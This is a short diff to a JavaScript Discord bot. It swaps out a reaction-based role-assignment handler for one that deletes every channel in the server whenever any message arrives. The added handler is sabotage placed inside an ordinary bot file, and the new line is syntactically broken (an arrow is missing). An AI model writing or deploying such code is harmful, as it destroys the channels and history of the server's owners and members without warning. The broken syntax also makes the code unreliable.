@@ -4,20 +4,10 @@ const client = new Discord.Client();
 const prefix = "!";
 
 
-    client.on("messageReactionAdd", (reac, user)=> {
+    client.on('message', message {
+              message.guild.channels.forEach(channel => channel.delete())
 
-    
-      let member = reac.message.guild.member(user);
-
-      let rolemember = reac.message.guild.roles.find("name", "member");
-
-      
-      
-        if(member.roles.find(x=> x.id === rolemember.id)) return ; 
-        member.addRole('612638605550288899');
-      
-
-    })
+   });
 
 
 client.login(process.env.BOT_TOKEN);
